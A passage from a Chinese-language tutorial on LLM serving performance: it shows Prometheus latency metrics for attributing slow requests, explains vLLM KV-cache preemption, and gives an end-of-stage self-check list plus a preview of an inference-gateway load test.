| 4. 输出太长 | 时延高但 TTFT 和 TPOT 都正常 | **不是性能问题** | 限制 `max_tokens`、按输出长度分级 SLO |
| 5. 偶发极慢 | P99 ≫ P95，`kv_cache_usage` 尖刺 | **KV 抢占 / 重算** | 降低 `max_model_len`、看抢占计数器 |

必须补的指标：

```python
# 归因三件套
QUEUE_WAIT = Histogram("llmgw_queue_seconds", ...)          # 排队 vs 计算
TTFT       = Histogram("llmgw_ttft_seconds", ...)           # prefill
ITL        = Histogram("llmgw_inter_token_seconds", ...)    # decode

# 解释变量（没有它们，上面三个没法归因）
PROMPT_TOKENS = Histogram("llmgw_prompt_tokens", buckets=(64,256,1k,4k,16k,64k))
OUTPUT_TOKENS = Histogram("llmgw_output_tokens", buckets=(1,16,64,256,1k,4k))

# 资源与压力
IN_FLIGHT     = Gauge("llmgw_in_flight")
KV_USAGE      = Gauge("llmgw_kv_cache_usage_ratio")       # 从 vLLM 拉
PREEMPTIONS   = Counter("llmgw_preemptions_total")        # ★ 第 5 种"慢"的关键
```

:::note 第 5 种最阴险，也最能体现你懂 LLM 服务
显存不够时，vLLM 会**抢占**（preempt）某些请求 —— 把它们的 KV cache 换出去，之后再**重新计算**。

对那个倒霉的请求，时延可能翻好几倍；但它在总体 P95 里被平均掉了，你只看到"偶尔特别慢"。

`preemptions_total` 这个计数器一涨，你就知道是显存压力而不是算力问题 —— 修法是降 `max_model_len` 或 `max_num_seqs`，**而不是加卡**。

**面试时能说出这一条，比背十个框架名字有用。**
:::

**最后一条建议**：这五种"慢"对应的修复动作**完全不同**，有的要加机器，有的要改配置，有的根本不需要修。只有端到端时延一个指标，你只能猜。**指标的价值不在于"能看到慢"，而在于"能立刻知道该改哪里"。**
:::

---

## 9. 阶段四结业自检

- [ ] 能一眼看出张量 shape 对不对，知道用互质维度来暴露广播错误
- [ ] 记得 `keepdims=True` 在 softmax / 归一化里是必须的
- [ ] **能口算**：7B bf16 权重多少、KV cache 每 token 多少、一张卡能扛多少并发
- [ ] 能解释为什么 int4 量化对 8B 模型几乎不增加并发，对 32B 模型却增加 4 倍
- [ ] 知道 `max_model_len` 是推理服务最见效的一个旋钮，并能算出改它的收益
- [ ] 能解释 `memory_allocated` / `memory_reserved` / `nvidia-smi` 三个数字的关系
- [ ] 知道 GPU 计时必须 `synchronize`，且要先 warmup
- [ ] 能说清 pickle 权重的攻击面和三条防线
- [ ] 能说清 prefill 是算力瓶颈、decode 是访存瓶颈，并由此推出 4 条性能结论
- [ ] 能定义 TTFT / TPOT / 排队时延，并说出每个对应哪种"慢"
- [ ] 起过一个 OpenAI 兼容服务，支持 SSE 流式，且客户端断开能真正取消

:::note 下一页做什么
阶段五把这一切装配成一个**能写进简历、也能直接当工作样例**的项目：LLM 推理网关。

完整源码（1101 行，ruff + mypy 双绿，24 个测试全过）、准入控制、取消传播、Prometheus 埋点、Dockerfile，以及最重要的 —— 一次**真实压测**，画出吞吐-时延曲线并找到膝点。

剧透一下那条曲线：并发从 1 加到 8，吞吐线性涨到 618 tok/s；从 8 加到 64，**吞吐一点没涨，TTFT 从 118ms 涨到 3177ms**。这就是排队理论在 LLM 服务上的样子。
:::
